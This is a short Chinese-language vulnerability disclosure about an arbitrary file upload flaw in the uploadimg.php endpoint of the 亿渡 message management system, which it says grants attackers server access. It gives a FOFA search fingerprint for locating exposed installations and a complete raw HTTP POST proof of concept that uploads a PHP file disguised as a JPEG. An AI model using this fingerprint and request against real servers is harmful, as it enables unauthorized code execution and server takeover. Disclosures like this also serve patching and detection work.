## 亿渡留言管理系统uploadimg存在任意文件上传漏洞

亿渡留言管理系统uploadimg存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

## fofa

```
body="/images/logo/logo140x38.png"
```

## poc

```yaml
POST /plugins/upload/uploadimg.php?fp=upimg HTTP/1.1
Host: 
Content-Length: 197
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="101"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypvPqblfrUine6bl3
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: userid=1; PHPSESSID=ov8kb5g3n4gng3lfskbnpbch37; Hm_lvt_448f02fca78a892e6d9c5f1c599ff906=1711623626; Hm_lpvt_448f02fca78a892e6d9c5f1c599ff906=1711623626
Connection: close

------WebKitFormBoundarypvPqblfrUine6bl3
Content-Disposition: form-data; name="file"; filename="a.php"
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundarypvPqblfrUine6bl3--
```

![image-20240707203825373](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407072038514.png)